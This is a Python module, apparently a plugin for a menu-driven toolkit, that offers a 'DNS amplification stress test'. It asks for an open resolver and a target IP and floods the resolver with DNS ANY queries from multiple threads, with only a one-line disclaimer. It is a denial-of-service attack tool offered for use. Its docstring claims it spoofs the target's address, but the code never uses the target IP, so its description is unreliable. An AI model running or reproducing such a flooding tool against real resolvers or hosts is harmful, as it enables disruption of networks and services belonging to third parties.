import socket
import threading
import color

DESCRIPTION = "DNS Amplification Stress Testing Tool"
GROUP_ID = 1  # Networking Tools
COLOR = color.BLUE

def send_dns_query(resolver_ip: str, target_ip: str, count: int):
    """Send crafted DNS ANY requests spoofing the target IP to open resolvers."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception:
        return

    # Standard DNS query packet requesting ANY records for a heavy domain to amplify response
    # Transaction ID (2 bytes), Flags (2 bytes), Questions (2 bytes), Answers (2 bytes), Authority (2 bytes), Additional (2 bytes)
    # Followed by query name and type (ANY = 255)
    dns_query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"

    sent = 0
    for _ in range(count):
        try:
            sock.sendto(dns_query, (resolver_ip, 53))
            sent += 1
        except Exception:
            pass

    sock.close()

def run():
    print(color.color_text("--- DNS Amplification Stress Tool ---", COLOR))
    print(color.color_text("[!] Warning: Use only for authorized network security testing and educational purposes.\n", color.RED))
    
    resolver = input("Enter open DNS resolver IP address (e.g., 8.8.8.8): ").strip()
    if not resolver:
        print(color.color_text("[!] Resolver IP cannot be empty.", color.RED))
        return

    target = input("Enter target IP address: ").strip()
    if not target:
        print(color.color_text("[!] Target IP cannot be empty.", color.RED))
        return

    try:
        target_ip = socket.gethostbyname(target)
        resolver_ip = socket.gethostbyname(resolver)
    except Exception as e:
        print(color.color_text(f"[!] Address resolution error: {e}", color.RED))
        return

    try:
        count = int(input("Enter queries per thread (e.g., 200): ").strip() or "200")
        threads_num = int(input("Enter number of concurrent threads (e.g., 5): ").strip() or "5")
    except ValueError:
        print(color.color_text("[!] Invalid numeric input provided.", color.RED))
        return

    print(color.color_text(f"\n[+] Starting DNS amplification test via resolver {resolver_ip} targeting {target_ip}...\n", color.GREEN))

    threads = []
    for _ in range(threads_num):
        t = threading.Thread(target=send_dns_query, args=(resolver_ip, target_ip, count))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(color.color_text(f"\n[+] DNS amplification test session finished.", color.CYAN))
